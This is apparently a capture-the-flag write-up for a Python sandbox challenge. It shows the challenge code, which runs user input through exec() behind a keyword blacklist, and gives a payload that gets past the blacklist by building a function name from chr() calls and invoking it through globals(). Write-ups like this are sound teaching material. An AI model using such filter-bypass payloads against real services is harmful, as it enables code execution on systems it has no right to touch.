this is classic python sandbox escape 
as you can see in the scenario files  
```python
┌──(sssubhammm ⌘ macbook-air)-[~/Downloads/misc_locked_away/challenge]
└─$ cat main.py
banner = r'''
.____                  __              .___    _____                        
|    |    ____   ____ |  | __ ____   __| _/   /  _  \__  _  _______  ___.__.
|    |   /  _ \_/ ___\|  |/ // __ \ / __ |   /  /_\  \ \/ \/ /\__  \<   |  |
|    |__(  <_> )  \___|    <\  ___// /_/ |  /    |    \     /  / __ \\___  |
|_______ \____/ \___  >__|_ \\___  >____ |  \____|__  /\/\_/  (____  / ____|
        \/          \/     \/    \/     \/          \/             \/\/     
'''


def open_chest():
    with open('flag.txt', 'r') as f:
        print(f.read())


blacklist = [
    'import', 'os', 'sys', 'breakpoint',
    'dir', 'print', 'subprocess', '[', ']',
    'echo', 'cat', '>', '<', '"', '\'', 'open'
]

print(banner)

while True:
    command = input('The chest lies waiting... ')

    if any(b in command for b in blacklist):
        print('Invalid command!')
        continue

    try:
        exec(command)
    except Exception:
        print('You have been locked away...')
        exit(1337)
```

open_chest func is already there ... we just have to call that  
so convert open_chest in to ascii char and send the payload to the service .. .and you will get the flag   
payload:  
`globals().get(chr(111)+chr(112)+chr(101)+chr(110)+chr(95)+chr(99)+chr(104)+chr(101)+chr(115)+chr(116))()`

